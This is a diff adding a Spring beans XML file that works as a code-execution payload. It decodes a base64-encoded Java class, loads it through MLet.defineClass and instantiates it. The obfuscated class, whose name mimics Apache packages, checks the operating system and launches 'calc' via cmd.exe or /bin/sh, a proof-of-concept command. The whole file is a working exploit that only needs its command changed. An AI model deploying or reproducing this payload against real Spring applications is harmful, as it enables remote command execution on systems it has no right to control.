@@ -1,0 +1,25 @@
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+                           http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="decoder" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
+        <property name="staticMethod" value="javax.xml.bind.DatatypeConverter.parseBase64Binary"/>
+        <property name="arguments">
+            <list>
+                <value>yv66vgAAADIAQAEAaW9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2pzb25Gb3JtYXRWaXNpdG9ycy9Kc29uSW50ZWdlckZvcm1hdFZpc2l0b3IyYTEzOGQ4MmU3MjQ0OWMzYTU3Y2NjMzYzYTMyMTcwYgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBAAg8Y2xpbml0PgEABGNhbGMIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA=</value>
+
+            </list>
+
+        </property>
+
+    </bean>
+
+    <bean id="classLoader" class="javax.management.loading.MLet"/>
+    <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
+        <constructor-arg ref="decoder"/>
+        <constructor-arg type="int" value="0"/>
+        <constructor-arg type="int" value="914"/>
+    </bean>
+
+    <bean factory-bean="clazz" factory-method="newInstance"/>
+</beans>
